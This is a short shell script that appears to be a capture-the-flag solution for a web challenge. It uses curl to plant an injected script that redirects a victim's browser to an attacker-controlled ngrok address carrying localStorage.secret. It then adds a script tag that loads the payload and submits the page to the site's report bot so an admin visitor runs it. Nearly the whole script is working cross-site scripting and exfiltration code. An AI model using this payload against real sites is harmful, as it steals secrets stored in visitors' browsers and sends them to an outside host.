tok=$RANDOM
host="http://ictf2.maple3142.net:11223"
your_website="http://a48b-140-115-214-31.ngrok-free.app"
curl "$host/$tok/*?*/;location='$your_website/?'+localStorage.secret//"
curl "$host/html$tok?<script/src=/$tok/*></script>"
echo ""
echo "Visit: $host/html$tok"
curl "$host/report" -G -d "url=$host/html$tok" -X POST
